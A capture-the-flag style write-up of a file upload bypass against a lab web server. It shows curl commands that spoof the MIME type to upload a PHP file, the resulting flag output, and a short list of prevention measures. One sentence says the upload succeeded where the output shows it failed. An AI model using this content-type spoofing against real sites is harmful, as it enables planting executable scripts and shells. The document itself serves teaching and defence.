# Description

Visiting the upload page. We are allowed to upload only images.

But what if we can bypass this and upload a php script that can be executed and give us a reveres shell.

# Attack

We will try to use curl and upload a php script.

```bash
*[main][~/projects/darkly/File Upload Bypass/Ressources]$ curl -i -X POST -F "uploaded=@file.php" -F Upload=Upload "http://10.14.59.83/?page=upload" | grep Your
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2861    0  2532  100   329  2287k   297k --:--:-- --:--:-- --:--:-- 2793k
<pre>Your image was not uploaded.</pre>
```
As you see, we can upload the php script since there's server side check that checks for the uploaded type.

So what we are going to do is to change the upload type to the allowed uploading type but instead of giving in an image we will send a `file.php`

```bash
*[main][~/projects/darkly/File Upload Bypass/Ressources]$ curl -i -X POST -F "uploaded=@file.php;type=image/jpg" -F Upload=Upload "http://10.14.59.83/?page=upload" | grep flag
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  3057    0  2743  100   314    547     62  0:00:05  0:00:05 --:--:--   720
<pre><center><h2 style="margin-top:50px;">The flag is : 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center> </pre><pre>/tmp/file.php succesfully uploaded.</pre>
```

And we got the flag.


# Prevent
	- *File Type Validation:* Implement strict file type validation on the server side. Only allow uploading of specific file types that are necessary for your application. This validation should be based on both file extension and MIME type.

	- *Content Disposition:*Set the Content-Disposition header to ensure that uploaded files are treated as attachments rather than executable files. This prevents browsers from interpreting uploaded files as scripts.

	- *Rename Files:* Rename uploaded files to a secure format that does not include user-provided content or known extensions. This can prevent attackers from exploiting file name-based vulnerabilities.

	- *Server-Side Checks:* Perform server-side checks to ensure that the uploaded file is indeed an image file. Use libraries or tools designed for image validation to ensure that the file is not maliciously crafted to exploit vulnerabilities.